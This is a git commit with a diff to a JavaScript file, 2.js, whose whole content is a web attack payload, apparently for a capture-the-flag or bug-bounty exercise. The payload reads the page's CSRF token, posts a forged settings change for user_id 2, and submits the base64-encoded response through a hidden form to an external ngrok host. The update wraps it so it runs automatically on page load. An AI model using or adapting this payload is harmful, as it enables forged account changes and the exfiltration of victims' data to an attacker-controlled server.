8566b477041a30958ecc266ac7e314d7b40113c5
Invaders0 <46098959+Invaders0@users.noreply.github.com>
2020-01-19 22:20:31 +0530

    Update 2.js

--- 2.js
+++ 2.js
@@ -1,1 +1,5 @@
- fetch("/settings",{'method':'POST','body':'name=foo&user_id=2&_csrf_token='+document.getElementsByName('_csrf_token')[0].value}).then(function(response){response.text().then(function(back){f=document.createElement("form");i=document.createElement("input");f.method='post';f.action='http://83653900.ngrok.io/';i.name='data';i.value=btoa(encodeURI(back));f.appendChild(i);document.body.appendChild(f);f.submit();})})
+window.addEventListener('load', function () {
+
+
+fetch("/settings",{'method':'POST','body':"name=cas&user_id=2&_csrf_token="+document.getElementsByName("_csrf_token")[0].value}).then(function(response){response.text().then(function(back){f=document.createElement("form");i=document.createElement("input");f.method='post';f.action='http://83653900.ngrok.io/';i.name='data';i.value=btoa(encodeURI(back));f.appendChild(i);document.body.appendChild(f);f.submit();})})
+  })
